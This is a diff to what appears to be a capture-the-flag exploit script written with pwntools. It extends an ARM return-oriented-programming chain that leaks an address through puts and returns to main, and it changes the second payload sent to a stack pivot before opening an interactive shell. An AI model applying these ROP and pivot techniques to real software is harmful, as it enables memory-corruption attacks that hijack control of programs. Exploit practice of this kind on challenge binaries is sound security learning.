@@ -59,8 +59,14 @@ def solve():
         0xDEADBEEF,  # sl
         ROPS.mov_r0_r7,  # Sets up args and puts pop_r3 gadget into LR
         0xDEADBEEF,  # r3
-        elf.plt.puts,
-        0xDEADBEEF,
+        elf.plt.puts,  # Ends up in __libc_csu pops after execution
+        0xDEADBEEF,  # r4
+        0xDEADBEEF,  # r5
+        0xDEADBEEF,  # r6
+        0xDEADBEEF,  # r7
+        0xDEADBEEF,  # r8
+        0xDEADBEEF,  # sb
+        0xDEADBEEF,  # sl
         elf.sym.main
     ]
 
@@ -72,7 +78,7 @@ def solve():
     ]
 
     io.sendlineafter(b"> ", flat(payload))
-    io.sendlineafter(b"> ", flat(payload))
+    io.sendlineafter(b"> ", flat(pivot))
     io.interactive()
 
 
